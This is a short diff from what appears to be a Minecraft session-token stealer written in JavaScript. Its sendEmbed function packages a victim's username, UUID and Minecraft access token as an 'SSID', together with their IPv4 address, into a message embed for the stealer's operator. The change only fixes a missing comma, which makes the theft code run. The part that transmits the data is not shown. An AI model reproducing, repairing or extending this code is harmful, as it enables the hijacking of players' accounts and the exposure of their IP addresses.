@@ -186,7 +186,7 @@ async function sendEmbed(MinecraftToken, uuid, username, ip) {
 			{
 				name: 'SSID',
 				value: `\`${username}:${uuid}:${MinecraftToken}\``,
-			}
+			},
 			{name: `IPV4`, value:`\`${ip}\``, inline: true }
 		)
 		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
